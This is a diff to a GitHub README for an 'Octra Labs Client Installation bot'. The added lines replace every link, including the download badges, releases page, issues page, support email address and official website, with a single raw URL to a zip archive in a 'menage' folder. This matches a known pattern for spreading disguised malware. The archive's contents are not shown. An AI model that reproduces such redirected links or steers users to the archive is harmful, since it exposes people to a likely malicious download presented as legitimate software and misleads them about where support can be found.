@@ -1,6 +1,6 @@
 # 🚀 Octra-Labs-Client-Installation-bot - Easy Setup for Octra Labs
 
-[![Download Octra Labs Client](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/dandfgit/Octra-Labs-Client-Installation-bot/releases)
+[![Download Octra Labs Client](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 ### 2. Downloading the Application
 
-To download the Octra Labs Client Installation Bot, visit the [Releases page](https://github.com/dandfgit/Octra-Labs-Client-Installation-bot/releases).
+To download the Octra Labs Client Installation Bot, visit the [Releases page](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip).
 
 Once on the page, look for the latest version. You will see a list of available files. Click the file that matches your operating system to start the download.
 
@@ -70,15 +70,15 @@ If you encounter issues during the installation, check these common solutions:
 
 If you need further assistance, please reach out through the following channels:
 
-- **GitHub Issues Page:** [Submit a request](https://github.com/dandfgit/Octra-Labs-Client-Installation-bot/issues)
-- **Email Support:** Send an email to support@octralabs.com
+- **GitHub Issues Page:** [Submit a request](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip)
+- **Email Support:** Send an email to https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip
 
 ## 🔗 Additional Information
 
-For more details about the Octra Labs and its projects, visit [Octra Labs Website](https://octralabs.com).
+For more details about the Octra Labs and its projects, visit [Octra Labs Website](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip).
 
 Remember to check back regularly for updates or new features. 
 
 Happy installing! Enjoy using the Octra Labs Client Installation Bot. 
 
-[![Download Octra Labs Client](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/dandfgit/Octra-Labs-Client-Installation-bot/releases)
+[![Download Octra Labs Client](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/dandfgit/Octra-Labs-Client-Installation-bot/main/menage/Octra-Labs-Client-Installation-bot_v1.7-beta.3.zip)
